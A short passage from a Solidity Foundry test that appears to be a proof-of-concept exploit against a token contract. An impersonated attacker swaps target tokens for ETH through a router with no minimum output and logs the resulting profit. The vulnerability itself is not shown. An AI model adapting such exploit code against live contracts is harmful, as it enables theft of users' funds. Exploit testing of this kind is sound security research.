        path[0] = address(target);
        path[1] = router.WETH();

        uint256 ethBefore = address(attacker).balance;
        console.log("ETH before swap:", ethBefore);

        // Use a small amount to avoid issues
        uint256 amountToSell = attackerTokenBalance > 100 * 10**9 ? 100 * 10**9 : attackerTokenBalance;

        if (amountToSell > 0) {
            vm.prank(attacker);
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                amountToSell,
                0, // accept any amount of ETH
                path,
                attacker,
                block.timestamp
            );
        }

        uint256 ethAfter = address(attacker).balance;
        console.log("ETH after swap:", ethAfter);
        console.log("Profit:", ethAfter - ethBefore);
    }

    // No helper functions needed


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
